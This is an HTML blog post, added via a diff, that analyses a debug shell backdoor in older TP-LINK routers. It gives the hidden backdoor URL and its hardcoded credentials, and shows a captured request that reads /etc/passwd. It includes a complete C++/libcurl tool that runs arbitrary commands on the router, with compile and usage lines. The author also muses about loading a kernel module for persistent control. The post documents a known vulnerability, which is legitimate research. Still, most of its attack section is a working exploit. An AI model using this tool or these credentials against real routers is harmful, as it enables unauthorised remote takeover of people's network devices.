@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta content="倾旋的博客" property="og:site_name">
+
+  <meta content="TP-LINK Shell调试后门浅析" property="og:title">
+
+
+  <meta content="article" property="og:type">
+
+
+  <meta content="本篇文章介绍一个TP-LINK低版本的一个Shell调试后门" property="og:description">
+
+
+  <meta content="http://localhost:4000/archivers/2017-12-06/1" property="og:url">
+
+
+  <meta content="2017-12-06T00:00:00+08:00" property="article:published_time">
+  <meta content="http://localhost:4000/about/" property="article:author">
+
+
+  <meta property="og:image" content="">
+
+
+  
+  <meta content="漏洞复现" property="article:section">
+  
+
+
+  
+
+  <title>TP-LINK Shell调试后门浅析</title>
+  <meta name="description" content="本篇文章介绍一个TP-LINK低版本的一个调试后门">
+<script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+  
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/ptsans.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firamono.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lato.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/sourcecodepro.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/gentiumbasic.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/alegreya.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lora.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firasans400.css' rel='stylesheet' type='text/css'>
+  <script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min2.2.0.js"></script>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/opensans.css' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/archivers/2017-12-06/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+<section>
+<nav class="navbar navbar-default navbar-fixed-top">
+
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">倾旋的博客</a>
+    </div>
+
+
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        
+        
+        <li><a href="/about/">关于我</a></li>
+
+        
+
+        
+        
+        <li><a href="/category/">Category</a></li>
+
+        
+
+        
+        
+        <li><a href="/contact/">Contact</a></li>
+
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+        <li><a href="/other/">其他信息</a></li>
+
+        
+
+        
+        
+        <li><a href="/tools/socat">socat 使用手册</a></li>
+
+        
+
+        
+
+
+      </ul>
+
+    <!--  <ul class="nav navbar-nav navbar-right">
+        <li><a href="#">Know More!</a></li>
+
+      </ul>-->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+</section>
+
+<section>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="jumbotron">
+    <div class="container">
+      <h1 class="post-title-main" itemprop="name headline">TP-LINK Shell调试后门浅析</h1>
+      <p class="post-meta"><time datetime="2017-12-06T00:00:00+08:00" itemprop="datePublished">Dec 6, 2017</time></p>
+      
+    </div>
+
+</div>
+
+
+  <div class="post-content container" itemprop="articleBody">
+    <p>本篇文章介绍一个TP-LINK低版本的一个调试后门
+<!--more--></p>
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>TPLINK 存在一个 Shell 调试后门，TPLINK WR941N V2_090803 路由器 后门，TP-link路由器后门漏洞。</p>
+
+<p>影响版本：</p>
+
+<p>WR740N, WR740ND, WR743ND, WR842ND, WA-901ND, WR941N, WR941ND, WR1043ND, WR2543ND, MR3220, MR3020, WR841N</p>
+
+<h2 id="0x01-分析">0x01 分析</h2>
+
+<p>该后门的地址在：<code class="highlighter-rouge">/userRpmNatDebugRpm26525557/linux_cmdline.html</code></p>
+
+<p>在公司刚好有一台，它的版本是：<code class="highlighter-rouge">TL-WR841N</code>。</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-12-06/2017-12-06-0x00.png" alt="0x00" /></p>
+
+<p>参考网上文章获得了用户名和密码：<code class="highlighter-rouge">osteam/5up</code></p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-12-06/2017-12-06-0x01.png" alt="0x01" /></p>
+
+<p>那么它是怎么执行命令的呢？会不会存在越权情况？PS:后来发现它必须要登录路由器才可以访问到这个Shell接口</p>
+
+<p>通过抓包发现，它会将命令发送到另外一个页面：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-12-06/2017-12-06-0x02.png" alt="0x02" /></p>
+
+<p>并且命令结果都在JS代码块中。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /userRpm/DebugResultRpm.htm?cmd=cat%20/etc/passwd&amp;usr=osteam&amp;passwd=5up HTTP/1.1
+Host: 192.168.3.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.3.1/userRpmNatDebugRpm26525557/linux_cmdline.html
+Authorization: Basic YWRtaW46YWRtaW4=
+X-Forwarded-For: 8.8.8.8
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+----------------------------------
+
+
+HTTP/1.1 200 OK
+Server: TP-LINK Router
+Connection: close
+Content-Type: text/html
+WWW-Authenticate: Basic realm="TP-LINK Wireless N Router WR841N"
+
+&lt;SCRIPT language="javascript" type="text/javascript"&gt;
+var cmdResult = new Array(
+"cat /etc/passwd&amp;\r\n811\r\n# root:x:0:0:root:/root:/bin/sh\r\nAdmin:x:0:0:root:/root:/bin/sh\r\nbin:x:1:1:bin:/bin:/bin/sh\r\ndaemon:x:2:2:daemon:/usr/sbin:/bin/sh\r\nadm:x:3:4:adm:/adm:/bin/sh\r\nlp:x:4:7:lp:/var/spool/lpd:/bin/sh\r\nsync:x:5:0:sync:/bin:/bin/sync\r\nshutdown:x:6:11:shutdown:/sbin:/sbin/shutdown\r\nhalt:x:7:0:halt:/sbin:/sbin/halt\r\nuucp:x:10:14:uucp:/var/spool/uucp:/bin/sh\r\noperator:x:11:0:Operator:/var:/bin/sh\r\nnobody:x:65534:65534:nobody:/home:/bin/sh\r\nap71:x:500:0:Linux User,,,:/root:/bin/sh\r\n\r\n",
+0,0 );
+&lt;/SCRIPT&gt;
+&lt;META http-equiv=Content-Type content="text/html; charset=gb2312"&gt;
+&lt;HTML&gt;
+&lt;HEAD&gt;&lt;TITLE&gt;TL-WR841N&lt;/TITLE&gt;
+&lt;META http-equiv=Pragma content=no-cache&gt;
+&lt;META http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT"&gt;
+&lt;LINK href="/dynaform/css_main.css" rel=stylesheet type="text/css"&gt;
+&lt;SCRIPT language="javascript" src="/dynaform/common.js" type="text/javascript"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT language="javascript" type="text/javascript"&gt;&lt;!--
+//--&gt;&lt;/SCRIPT&gt;
+&lt;script language="Javascript"&gt;
+function doGetResult()
+{
+	location.href="/userRpm/DebugResultRpm.htm";
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;script language="JavaScript"&gt;
+	var	timeInterVal = 2000;
+	obj = parent.document.getElementById("result");
+	var temp = obj.scrollTop;
+	obj.value += cmdResult[0];
+	obj.scrollTop = temp;
+	if(parent.bIsonFocus == 0)
+		obj.scrollTop = obj.scrollHeight;
+	setTimeout("doGetResult()",timeInterVal);
+&lt;/script&gt;
+</code></pre></div></div>
+
+<p>其中：<code class="highlighter-rouge">Authorization: Basic YWRtaW46YWRtaW4=</code>就是路由器的权限认证方式了，并且调试接口的用户名密码是以GET方式传输的</p>
+
+<h2 id="0x02-动起手来">0x02 动起手来</h2>
+
+<p>我使用C++写了一个测试的程序，主要是还原它发送的数据。</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
+#include &lt;curl/curl.h&gt;
+#include &lt;regex&gt;
+#include &lt;string&gt;
+#define TIMEOUT 5
+</span>
+<span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">m_replace</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">strSrc</span><span class="p">,</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="o">&amp;</span><span class="n">oldStr</span><span class="p">,</span> <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="o">&amp;</span><span class="n">newStr</span><span class="p">,</span><span class="kt">int</span> <span class="n">count</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">strRet</span><span class="o">=</span><span class="n">strSrc</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">l_count</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">count</span><span class="p">)</span>
+        <span class="n">count</span> <span class="o">=</span> <span class="n">strRet</span><span class="p">.</span><span class="n">size</span><span class="p">();</span>
+    <span class="k">while</span> <span class="p">((</span><span class="n">pos</span> <span class="o">=</span> <span class="n">strRet</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">oldStr</span><span class="p">,</span> <span class="n">pos</span><span class="p">))</span> <span class="o">!=</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">::</span><span class="n">npos</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">strRet</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">oldStr</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="n">newStr</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">++</span><span class="n">l_count</span> <span class="o">&gt;=</span> <span class="n">count</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+        <span class="n">pos</span> <span class="o">+=</span> <span class="n">newStr</span><span class="p">.</span><span class="n">size</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">strRet</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">size_t</span> <span class="n">WriteData</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">pData</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nmemb</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">stream</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="o">*</span><span class="n">pStr</span> <span class="o">=</span> <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="o">*</span><span class="p">)</span><span class="n">stream</span><span class="p">;</span>
+
+    <span class="kt">size_t</span> <span class="n">len</span>  <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="n">nmemb</span><span class="p">;</span>
+    <span class="n">pStr</span><span class="o">-&gt;</span><span class="n">append</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pData</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">){</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Usage: "</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">" &lt;HOST&gt; &lt;Username&gt; &lt;Password&gt; &lt;Command&gt;"</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Version: WR740N, WR740ND, WR743ND, WR842ND, WA-901ND, WR941N, WR941ND, WR1043ND, WR2543ND, MR3220, MR3020, WR841N"</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">username</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">password</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">command</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">body</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">commands</span> <span class="o">=</span> <span class="n">curl_escape</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">data</span><span class="p">(),</span><span class="n">command</span><span class="p">.</span><span class="n">size</span><span class="p">());</span>
+    <span class="n">host</span><span class="o">=</span><span class="s">"http://"</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s">"/userRpm/DebugResultRpm.htm?cmd="</span><span class="o">+</span><span class="n">commands</span><span class="o">+</span><span class="s">"&amp;usr=osteam&amp;passwd=5up"</span><span class="p">;</span>
+
+    <span class="n">CURL</span> <span class="o">*</span> <span class="n">curl</span> <span class="o">=</span> <span class="n">curl_easy_init</span><span class="p">();</span>
+    <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span><span class="n">CURLOPT_URL</span><span class="p">,</span><span class="n">host</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
+    <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span><span class="n">CURLOPT_TIMEOUT</span><span class="p">,</span><span class="n">TIMEOUT</span><span class="p">);</span>
+    <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span><span class="n">CURLOPT_USERNAME</span><span class="p">,</span><span class="n">username</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
+    <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span><span class="n">CURLOPT_PASSWORD</span><span class="p">,</span><span class="n">password</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
+    <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span><span class="n">CURLOPT_WRITEFUNCTION</span><span class="p">,</span><span class="n">WriteData</span><span class="p">);</span>
+    <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span><span class="n">CURLOPT_WRITEDATA</span><span class="p">,</span><span class="n">body</span><span class="p">);</span>
+    <span class="n">CURLcode</span> <span class="n">res</span> <span class="o">=</span> <span class="n">curl_easy_perform</span><span class="p">(</span><span class="n">curl</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">res</span> <span class="o">!=</span><span class="mi">0</span><span class="p">){</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"ERROR"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">curl_easy_cleanup</span><span class="p">(</span><span class="n">curl</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kt">int</span> <span class="n">status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">curl_easy_getinfo</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span><span class="n">CURLINFO_RESPONSE_CODE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">200</span> <span class="o">||</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">401</span><span class="p">){</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"ERROR Incorrect username or password."</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">//std::cout &lt;&lt; body &lt;&lt; std::endl;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">regex</span> <span class="n">match_command_result</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">(</span><span class="se">\\</span><span class="s">n.*</span><span class="se">\\</span><span class="s">n0,0 </span><span class="se">\\</span><span class="s">)"</span><span class="p">);</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">smatch</span> <span class="n">mth</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">regex_search</span><span class="p">(</span><span class="n">body</span><span class="p">,</span><span class="n">mth</span><span class="p">,</span><span class="n">match_command_result</span><span class="p">);</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">m_replace</span><span class="p">(</span><span class="n">mth</span><span class="p">.</span><span class="n">str</span><span class="p">(),</span><span class="s">"</span><span class="se">\\</span><span class="s">r</span><span class="se">\\</span><span class="s">n"</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="n">curl_easy_cleanup</span><span class="p">(</span><span class="n">curl</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>编译：<code class="highlighter-rouge">g++ main.cpp -lcurl -o tplinkShell</code></p>
+
+<p>使用过程：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-12-06/2017-12-06-0x03.png" alt="0x03" /></p>
+
+<p>:-) 正则写的不好，莫见怪</p>
+
+<h2 id="0x03-测试写入文件---编写内核模块">0x03 测试写入文件 - 编写内核模块</h2>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-12-06/2017-12-06-0x04.png" alt="0x04" /></p>
+
+<p>发现Web目录是不可写、不可读的。</p>
+
+<p>参考：<code class="highlighter-rouge">https://www.cnblogs.com/amaoxiaozhu/archive/2013/03/08/2950002.html</code></p>
+
+<p>可以进行编写mod，使内核加载</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-12-06/2017-12-06-0x05.png" alt="0x05" /></p>
+
+<p>传送门：https://www.cnblogs.com/skyred99/p/5683710.html</p>
+
+<p>这块先放着，后面如过理解了再尝试导入内核模块，永久控制路由器</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payloads@koone:~<span class="nv">$ </span>./tplinkShell 192.168.3.1 admin admin <span class="s2">"/sbin/insmod"</span>
+<span class="o">(</span>
+<span class="s2">"/sbin/insmod
+BusyBox v1.01 (2009.01.06-01:38+0000) multi-call binary
+
+Usage: insmod [OPTION]... MODULE [symbol=value]...
+
+Loads the specified kernel modules into the kernel.
+
+Options:
+	-f	Force module to load into the wrong kernel version.
+	-k	Make module autoclean-able.
+	-v	verbose output
+	-q	quiet output
+	-L	Lock to prevent simultaneous loads of a module
+	-o NAME	Set internal module name to NAME
+	-x	do not export externs
+</span></code></pre></div></div>
+
+<p>insmod用于加载模块</p>
+
+  </div>
+
+</article>
+
+</section>
+<nav class="navbar navbar-default navbar-fixed-bottom">
+  <div class="container footer-content">
+    Copyright @ 2018 by 倾旋<br>
+    Powered By Jekyll
+  </div>
+</nav>
+
+  </body>
+
+</html>
